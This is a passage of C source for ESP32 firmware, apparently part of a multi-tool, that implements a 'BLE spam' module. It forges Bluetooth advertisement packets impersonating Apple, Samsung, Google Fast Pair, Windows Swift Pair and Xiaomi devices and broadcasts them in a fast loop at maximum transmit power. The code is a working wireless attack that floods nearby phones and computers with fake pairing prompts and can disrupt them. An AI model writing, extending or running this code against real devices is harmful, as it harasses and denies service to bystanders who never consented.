    out[n++] = (uint8_t)((model >>  8) & 0xFF);
    out[n++] = (uint8_t)( model        & 0xFF);
    out[n++] = 0x02; out[n++] = 0x0A;
    out[n++] = (uint8_t)((esp_random() % 120) - 100);   /* random TX power */
    return n;  /* 14 */
}

/* Windows Swift Pair — normal (7 + name) or headphone (16 + name) variant */
static size_t build_swiftpair(uint8_t *out, uint32_t idx)
{
    uint32_t total = SWIFTPAIR_NAMES_N + SWIFTPAIR_HP_NAMES_N;
    uint32_t k = idx % total;
    size_t i = 0;

    if (k < SWIFTPAIR_NAMES_N) {
        const char *name = SWIFTPAIR_NAMES[k];
        size_t name_len = strlen(name);
        if (name_len > PAD_LEN - 7) name_len = PAD_LEN - 7;   /* max 24 */
        out[i++] = (uint8_t)(name_len + 6);
        out[i++] = 0xFF;
        out[i++] = 0x06; out[i++] = 0x00;
        out[i++] = 0x03; out[i++] = 0x00; out[i++] = 0x80;
        memcpy(out + i, name, name_len); i += name_len;
    } else {
        const char *name = SWIFTPAIR_HP_NAMES[k - SWIFTPAIR_NAMES_N];
        size_t name_len = strlen(name);
        if (name_len > PAD_LEN - 16) name_len = PAD_LEN - 16;  /* max 15 */
        out[i++] = (uint8_t)(name_len + 15);
        out[i++] = 0xFF;
        out[i++] = 0x06; out[i++] = 0x00;
        out[i++] = 0x03; out[i++] = 0x01; out[i++] = 0x80;
        out[i++] = 0xD7; out[i++] = 0x2F; out[i++] = 0xD2;
        out[i++] = 0xF4; out[i++] = 0x61; out[i++] = 0xE4;
        out[i++] = 0x04; out[i++] = 0x04; out[i++] = 0x00;
        memcpy(out + i, name, name_len); i += name_len;
    }
    return i;
}

/* 28 bytes — Xiaomi MiBeacon */
static size_t build_xiaomi(uint8_t *out, uint32_t idx)
{
    uint16_t device_code =
        XIAOMI_DEVICE_CODES[idx % XIAOMI_DEVICE_CODES_N];

    size_t i = 0;
    out[i++] = 0x1B; out[i++] = 0xFF; out[i++] = 0x8F; out[i++] = 0x03;
    out[i++] = 0x16; out[i++] = 0x01; out[i++] = 0x20;
    out[i++] = (device_code >> 8) & 0xFF;
    out[i++] = device_code & 0xFF;
    out[i++] = 0x17; out[i++] = 0x0A; out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x88; out[i++] = 0x50;
    out[i++] = 0x11; out[i++] = 0xB1; out[i++] = 0xFF;
    esp_fill_random(&out[i], 2); i += 2;
    memset(&out[i], 0, 6); i += 6;
    return i;  /* 28 */
}

/* ============================================================
 * pick_payload — no padding, exact length only
 * ============================================================ */
static size_t pick_payload(ble_spam_type_t type, uint8_t *out, size_t out_size,
                           uint32_t idx)
{
    if (out_size < PAD_LEN) return 0;
    size_t len = 0;

    switch (type) {
        case BLE_SPAM_APPLE_JUICE:      len = build_apple_proximity_pair(out, idx); break;
        case BLE_SPAM_SOUR_APPLE:       len = build_apple_nearby_action(out, idx);  break;
        case BLE_SPAM_SAMSUNG:
            /* Alternate buds/watch deterministically; each walks its own table */
            if (idx & 1) len = build_samsung_buds(out, idx >> 1);
            else         len = build_samsung_watch(out, idx >> 1);
            break;
        case BLE_SPAM_GOOGLE_FASTPAIR:  len = build_fastpair(out, idx);   break;
        case BLE_SPAM_WINDOWS_SWIFTPAIR: len = build_swiftpair(out, idx);  break;
        case BLE_SPAM_XIAOMI_MIBEACON:  len = build_xiaomi(out, idx);     break;
        default: return 0;
    }

    if (len == 0 || len > PAD_LEN) return 0;
    if (!validate_ad(out, len)) {
        ESP_LOGW(TAG, "malformed payload type=%s len=%u",
                 ble_spam_type_name(type), (unsigned)len);
        return 0;
    }
    return len;
}

/* ============================================================
 * Main task
 * ============================================================ */
static void ble_spam_task(void *arg)
{
    (void)arg;
    s_started_us = esp_timer_get_time();
    s_cycles_sent = 0;
    s_fail_count = 0;
    uint32_t cycle = 0;
    uint32_t last_log_sec = 0;
    uint32_t dumped_types_mask = 0;
    uint32_t consec_fail = 0;

    /* Pause NUS advertising so the spam advertiser is not fighting the app's
     * connectable advert for airtime on the single radio. The active GATT
     * connection stays up, so the app can still send "blespam stop". */
    transport_ble_pause_adv();
    vTaskDelay(pdMS_TO_TICKS(50));   /* let NimBLE settle (mirrors ble_scanner) */

    if (!ensure_addr()) {
        vTaskDelay(pdMS_TO_TICKS(500));
        if (!ensure_addr()) {
            io_log("blespam: address resolution failed\r\n");
            goto exit;
        }
    }

    io_log("blespam: START type=%s delay=%ums dur=%us\r\n",
           ble_spam_type_name(s_current_type), (unsigned)s_delay_ms,
           (unsigned)s_duration_sec);

    uint8_t payload_buf[PAD_LEN];

    while (s_running) {
        /* Duration check */
        int64_t elapsed_ms = (esp_timer_get_time() - s_started_us) / 1000;
        if (s_duration_sec > 0 &&
            (uint32_t)(elapsed_ms / 1000) >= s_duration_sec) break;

        /* Re-read dwell each iteration so ble_spam_set_delay() is live */
        uint32_t dwell = s_delay_ms;
        if (dwell < DWELL_MS_MIN) dwell = DWELL_MS_MIN;
        if (dwell > DWELL_MS_MAX) dwell = DWELL_MS_MAX;

        uint32_t slot_cycles = SLOT_MS / dwell;
        if (slot_cycles < 1) slot_cycles = 1;

        /* Resolve effective type (All / Android use slot switching) */
        ble_spam_type_t type = s_current_type;
        if (type == BLE_SPAM_ALL) {
            type = (ble_spam_type_t)((cycle / slot_cycles) % 6);
        } else if (type == BLE_SPAM_ANDROID) {
            type = ((cycle / slot_cycles) & 1)
                 ? BLE_SPAM_GOOGLE_FASTPAIR
                 : BLE_SPAM_SAMSUNG;
        }

        size_t len = pick_payload(type, payload_buf, sizeof(payload_buf), cycle);
        if (len == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
            cycle++;
            continue;
        }

        /* Dump payload once per type per session */
        uint32_t bit = 1u << (uint32_t)type;
        if (!(dumped_types_mask & bit)) {
            dumped_types_mask |= bit;
            dump_payload(ble_spam_type_name(type), payload_buf, len);
        }

        int rc = transmit_payload(SPAM_INSTANCE, payload_buf, len);
        if (rc == 0) {
            s_cycles_sent++;
            consec_fail = 0;
        } else {
            if (s_fail_count < 5) {
                s_fail_count++;
                ESP_LOGW(TAG, "transmit rc=%d type=%s len=%u",
                         rc, ble_spam_type_name(type), (unsigned)len);
            }
            /* Controller may be wedged (e.g. a stop that never clears, leaving a
             * stale advert with a stale MAC on air → receivers de-dup it). Re-
             * configure the instance instead of broadcasting it forever. */
            if (++consec_fail >= FAIL_RECOVER_N) {
                ble_gap_ext_adv_stop(SPAM_INSTANCE);
                ble_gap_ext_adv_remove(SPAM_INSTANCE);
                configure_instance(SPAM_INSTANCE);
                consec_fail = 0;
                ESP_LOGW(TAG, "spam instance reconfigured after %d failures",
                         FAIL_RECOVER_N);
            }
        }

        /* Chunked dwell — task responds to s_running within 50 ms */
        for (uint32_t waited = 0; waited < dwell && s_running; waited += DWELL_CHUNK_MS) {
            uint32_t chunk = dwell - waited;
            if (chunk > DWELL_CHUNK_MS) chunk = DWELL_CHUNK_MS;
            vTaskDelay(pdMS_TO_TICKS(chunk));
        }
        cycle++;

        /* Stats every 2 s */
        uint32_t sec = (uint32_t)((esp_timer_get_time() - s_started_us) / 1000000);
        if (sec - last_log_sec >= 2) {
            last_log_sec = sec;
            uint32_t fps = s_cycles_sent / sec;
            io_log("blespam: %us type=%s delay=%ums frames=%u fps=%u\r\n",
                   (unsigned)sec, ble_spam_type_name(type), (unsigned)dwell,
                   (unsigned)s_cycles_sent, (unsigned)fps);
        }
    }

    stop_all_instances();
    vTaskDelay(pdMS_TO_TICKS(20));

exit:
    transport_ble_resume_adv();   /* restore app advertising on every exit path */
    s_running = false;
    s_task = NULL;
    io_log("blespam: STOPPED cycles=%u\r\n", (unsigned)s_cycles_sent);
    vTaskDelete(NULL);
}

/* ============================================================
 * Public API
 * ============================================================ */
static void ble_spam_selftest(void)
{
    static const ble_spam_type_t types[] = {
        BLE_SPAM_APPLE_JUICE, BLE_SPAM_SOUR_APPLE, BLE_SPAM_SAMSUNG,
        BLE_SPAM_GOOGLE_FASTPAIR, BLE_SPAM_WINDOWS_SWIFTPAIR,
        BLE_SPAM_XIAOMI_MIBEACON,
    };
    static const size_t expected_len[] = { 31, 11, 0, 14, 0, 28 };
    uint8_t buf[PAD_LEN];
    int ok = 0;
    for (size_t i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
        bool type_ok = true;
        for (int draw = 0; draw < 8 && type_ok; draw++) {
            size_t len = pick_payload(types[i], buf, sizeof(buf), (uint32_t)draw);
            if (len == 0) { type_ok = false; break; }
            if (expected_len[i] != 0 && len != expected_len[i]) {
                ESP_LOGE(TAG, "selftest: %s len=%u expected=%u",
                         ble_spam_type_name(types[i]),
                         (unsigned)len, (unsigned)expected_len[i]);
                type_ok = false;
            }
        }
        if (type_ok) ok++;
        else ESP_LOGE(TAG, "selftest FAILED type=%s",
                      ble_spam_type_name(types[i]));
    }
    ESP_LOGI(TAG, "selftest: %d/%d payload builders OK",
             ok, (int)(sizeof(types) / sizeof(types[0])));
}

esp_err_t ble_spam_init(void)
{
    s_lock = xSemaphoreCreateMutex();
    if (!s_lock) return ESP_ERR_NO_MEM;

    esp_err_t tx_rc = esp_ble_tx_power_set_enhanced(
        ESP_BLE_ENHANCED_PWR_TYPE_ADV, 0, ESP_PWR_LVL_P20);
    if (tx_rc != ESP_OK) {
        ESP_LOGW(TAG, "enhanced tx power failed: %d", tx_rc);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20);
    }
    ESP_LOGI(TAG, "TX power set to +20 dBm");

    ble_spam_selftest();
    return ESP_OK;
}

esp_err_t ble_spam_start(ble_spam_type_t type, uint32_t delay_ms,
                         uint32_t duration_sec)
{
    if (!s_lock) return ESP_ERR_INVALID_STATE;
    if (type >= BLE_SPAM_TYPE_COUNT) return ESP_ERR_INVALID_ARG;

    if (ble_scanner_is_running()) ble_scanner_stop();
    if (ble_spectrum_is_running()) ble_spectrum_stop();
    if (wifi_spam_is_running()) wifi_spam_stop();

    if (delay_ms < DWELL_MS_MIN) delay_ms = DWELL_MS_MIN;
    if (delay_ms > DWELL_MS_MAX) delay_ms = DWELL_MS_MAX;
    if (duration_sec > 3600) duration_sec = 3600;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_running || s_task != NULL) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    stop_all_instances();

    int cfg_rc = configure_instance(SPAM_INSTANCE);
    if (cfg_rc != 0) {
        io_log("blespam: configure failed rc=%d\r\n", cfg_rc);
        stop_all_instances();
        xSemaphoreGive(s_lock);
        return ESP_FAIL;
    }

    s_current_type = type;
    s_delay_ms = delay_ms;
    s_duration_sec = duration_sec;
    s_running = true;

    BaseType_t ok = xTaskCreate(ble_spam_task, "ble_spam", 4096,
                                NULL, 4, &s_task);
    xSemaphoreGive(s_lock);
    if (ok != pdPASS) {
        s_running = false;
        s_task = NULL;
        stop_all_instances();
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_lock) return ESP_ERR_INVALID_STATE;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_running) { xSemaphoreGive(s_lock); return ESP_ERR_INVALID_STATE; }
    s_running = false;
    xSemaphoreGive(s_lock);

    /* Task checks s_running every DWELL_CHUNK_MS (50 ms) so should exit
     * within ~100 ms. Give it up to 500 ms to be safe. */
    for (int i = 0; i < 50 && s_task != NULL; i++)
        vTaskDelay(pdMS_TO_TICKS(10));
    return ESP_OK;
}

esp_err_t ble_spam_set_delay(uint32_t delay_ms)
{
    if (delay_ms < DWELL_MS_MIN) delay_ms = DWELL_MS_MIN;
    if (delay_ms > DWELL_MS_MAX) delay_ms = DWELL_MS_MAX;
    s_delay_ms = delay_ms;
    return ESP_OK;
}

bool ble_spam_is_running(void) { return s_running; }
ble_spam_type_t ble_spam_current_type(void) { return s_current_type; }
uint32_t ble_spam_current_delay(void) { return s_delay_ms; }
uint32_t ble_spam_frames_sent(void) { return s_cycles_sent; }

uint32_t ble_spam_default_delay(ble_spam_type_t type)
{
    /* Mirror the app defaults: Apple/Sour rotate fastest, others a touch slower */
    switch (type) {
        case BLE_SPAM_APPLE_JUICE:
        case BLE_SPAM_SOUR_APPLE:
            return 20;
        default:
            return 50;
    }
}

const char *ble_spam_type_name(ble_spam_type_t type)
{
    switch (type) {
        case BLE_SPAM_APPLE_JUICE:      return "apple";
        case BLE_SPAM_SOUR_APPLE:        return "sourapple";
        case BLE_SPAM_SAMSUNG:           return "samsung";
        case BLE_SPAM_GOOGLE_FASTPAIR:   return "google";
        case BLE_SPAM_WINDOWS_SWIFTPAIR: return "windows";
        case BLE_SPAM_XIAOMI_MIBEACON:   return "xiaomi";
        case BLE_SPAM_ALL:               return "all";
        case BLE_SPAM_ANDROID:           return "android";
        default:                          return "?";
    }
}
